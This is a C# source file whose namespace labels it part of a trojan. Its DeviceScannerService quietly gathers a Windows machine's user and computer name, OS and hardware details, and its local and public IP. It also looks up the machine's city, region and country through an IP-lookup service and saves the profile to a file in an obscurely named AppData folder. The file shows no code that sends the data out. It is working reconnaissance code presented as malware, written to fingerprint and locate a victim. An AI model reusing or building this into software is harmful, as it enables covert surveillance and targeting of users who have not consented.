using System;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Text.Json;
using Microsoft.Win32;
using System.Management;
using System.Runtime.InteropServices;

namespace Trojan.Services
{
    public static class DeviceScannerService
    {
        public static async Task SaveDeviceInfo()
        {
            StringBuilder sb = new();
            sb.AppendLine("=== DEVICE INFO ===");
            sb.AppendLine();
            sb.AppendLine($"User: {Environment.UserName}");
            sb.AppendLine($"PC Name: {Environment.MachineName}");
            sb.AppendLine($"OS: {RuntimeInformation.OSDescription}");
            sb.AppendLine($"64 Bit OS: {Environment.Is64BitOperatingSystem}");
            sb.AppendLine($"CPU: {GetCPU()}");
            sb.AppendLine($"GPU: {GetGPU()}");
            sb.AppendLine($"RAM: {GetRAM()} GB");
            sb.AppendLine($"Dark Mode: {IsDarkMode()}");
            sb.AppendLine($"Local IP: {GetLocalIP()}");
            await AddPublicIPInfo(sb);

            // Folder path
            string folder =
                Path.Combine(
                    Environment.GetFolderPath(
                        Environment.SpecialFolder.ApplicationData),
                    "gnezdece");

            // Create folder
            Directory.CreateDirectory(folder);

            // File path
            string file =
                Path.Combine(folder, "device_info.txt");

            // Save file
            await File.WriteAllTextAsync(file, sb.ToString());
        }

        static string GetCPU()
        {
            using var searcher =
                new ManagementObjectSearcher(
                    "select Name from Win32_Processor");

            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Name"]?.ToString();
            }

            return "Unknown";
        }

        static string GetGPU()
        {
            using var searcher =
                new ManagementObjectSearcher(
                    "select Name from Win32_VideoController");

            foreach (ManagementObject obj in searcher.Get())
            {
                return obj["Name"]?.ToString();
            }

            return "Unknown";
        }

        static double GetRAM()
        {
            using var searcher =
                new ManagementObjectSearcher(
                    "SELECT TotalPhysicalMemory FROM Win32_ComputerSystem");

            foreach (ManagementObject obj in searcher.Get())
            {
                double ram =
                    Convert.ToDouble(obj["TotalPhysicalMemory"]);

                return Math.Round(ram / 1024 / 1024 / 1024, 2);
            }

            return 0;
        }

        static bool IsDarkMode()
        {
            try
            {
                using RegistryKey key =
                    Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize");

                object value =
                    key?.GetValue("AppsUseLightTheme");

                if (value != null)
                {
                    return (int)value == 0;
                }
            }
            catch { }

            return false;
        }

        static string GetLocalIP()
        {
            foreach (NetworkInterface ni in
                     NetworkInterface.GetAllNetworkInterfaces())
            {
                var props = ni.GetIPProperties();

                foreach (var ua in props.UnicastAddresses)
                {
                    if (ua.Address.AddressFamily ==
                        System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ua.Address.ToString();
                    }
                }
            }

            return "Unknown";
        }

        static async Task AddPublicIPInfo(StringBuilder sb)
        {
            try
            {
                using HttpClient client = new();

                string json =
                    await client.GetStringAsync(
                        "https://ipinfo.io/json");

                using JsonDocument doc =
                    JsonDocument.Parse(json);

                var root = doc.RootElement;

                sb.AppendLine(
                    $"Public IP: {root.GetProperty("ip")}");

                sb.AppendLine(
                    $"City: {root.GetProperty("city")}");

                sb.AppendLine(
                    $"Region: {root.GetProperty("region")}");

                sb.AppendLine(
                    $"Country: {root.GetProperty("country")}");
            }
            catch
            {
                sb.AppendLine(
                    "Failed to fetch public IP.");
            }
        }
    }
}